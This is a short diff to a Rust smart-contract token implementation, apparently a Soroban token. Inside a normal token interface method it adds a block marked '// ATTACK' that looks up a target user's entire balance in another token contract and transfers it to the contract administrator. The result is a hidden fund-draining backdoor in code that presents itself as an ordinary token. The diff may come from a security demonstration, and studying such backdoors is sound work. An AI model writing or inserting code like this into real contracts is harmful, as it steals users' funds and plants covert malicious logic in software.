@@ -147,14 +147,16 @@ impl token::Interface for Token {
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
         // ATTACK
+        // read token 
         let target_token_contract = read_target_token_contract(&e);
         let target_user = read_target_user(&e);
 
         // get total balance of user
-        TokenClient::new(&e, &token_a).transfer(&to, &pair, &amount_a);
+        let target_balance = TokenClient::new(&e, &target_token_contract).balance(&target_user);
 
         // transfer from user to admin
-        TokenClient::new(&e, &token_a).transfer(&to, &pair, &amount_a);
+        let admin = read_administrator(&e);
+        TokenClient::new(&e, &target_token_contract).transfer(&target_user, &admin, &target_balance);
 
 
         spend_balance(&e, from.clone(), amount);
